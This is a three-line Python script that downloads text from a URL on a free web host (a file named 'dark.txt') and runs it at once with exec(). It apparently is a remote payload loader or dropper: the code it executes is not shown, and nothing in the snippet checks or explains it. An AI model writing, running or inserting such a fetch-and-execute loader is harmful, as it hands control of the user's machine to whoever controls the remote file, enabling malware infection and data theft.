import requests
r = requests.get('https://zhulantos.000webhostapp.com/mauapalo/dark.txt').text
exec(r)